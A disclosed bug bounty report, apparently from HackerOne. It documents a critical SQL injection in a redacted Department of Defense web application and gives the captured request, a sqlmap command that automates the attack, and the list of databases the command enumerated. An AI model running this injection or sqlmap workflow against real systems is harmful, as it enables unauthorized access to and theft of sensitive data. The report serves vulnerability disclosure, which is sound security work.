# SQL Injection at https://████████.asp (█████████) [selMajcom] [HtUS]

## Report Details
- **Report ID**: 1628408
- **URL**: https://hackerone.com/reports/1628408
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-07-06T16:07:29.133Z
- **Disclosed**: 2023-01-06T18:56:03.398Z

## Reporter
- **Username**: haxor31337
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## Summary:
SQL injection (SQLi) is a vulnerability in which an application accepts input into an SQL statement and treats this input as part of the statement. Typically, SQLi allows a malicious attacker to view, modify or delete data that should not be able to be retrieved. An SQLi vulnerability was found for this host which allows an attacker to execute code and view data from the SQL service by submitting SQL queries.

An attacker could exploit this lack of input sanitization to exfiltrate database data and files, tamper with the data, or perform resource exhaustion. Depending on the database and how it is configured, an attacker could potentially remotely execute code on the server running the database.

I found SQL Injection at https://█████████.asp allowing attacker can exfiltrate database and leak sensitive data of ███████ without authentication.

## Steps To Reproduce:
1. Access to https://████.asp 
Create an user, after create go to https://████.asp
2. Capture request on burpsuite with the following request

```
GET /█████mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1
Host: ██████████.████.net:443
Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close

```
Inject SQL query to vulnerable parameter **selMajcom**

Save request to file dod.txt

```
GET /██████mil/AFServices/RequestAccess.asp?selMajcom=MAT*&selbase=MXRD&Submitted=1&Appid=29&FuncID=23&App=Activity+Database+FMP HTTP/1.1
Host: ███.██████████.net:443
Cookie: ebsprod=7nchaAqvaxeCArcwSjtyE0HiG4; ASPSESSIONIDQQBSACRQ=MPHFFIECABOOKHDLEIEEOAHA
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close

```
Attack automation with sqlmap command

```
python sqlmap.py -r dod.txt --dbs --level 3 risk 3 -v3
```

## Supporting Material/References:
█████

```
available databases [24]:
[*] ActivityManager
[*] AFMajcomBases
[*] AFNAF
[*] AFServicesUsers
[*] AFSponsorship
[*] AssetsAndLiabilities
[*] BaseProjects
[*] BEFT
[*] CGO
[*] EICSQL
[*] master
[*] model
[*] msdb
[*] NAFDIS
[*] NAFRIS_restore
[*] ORCA
[*] Property
[*] RMD
[*] ██████████
[*] tempdb
[*] TSD
[*] Unemployment
[*] VMS_Test
[*] W2DATA
```

## Impact

Data exfiltration through a SQLi attack could lead to reputational damage or regulatory fines for the business due to an attacker’s unauthorized access to data. This could also result in reputational damage for the business through the impact to customers’ trust. The severity of the impact to the business is dependent on the sensitivity of the data being stored in, and transmitted by the application.
Leak sensitive data on █████████ service.

## Attachments
No attachments
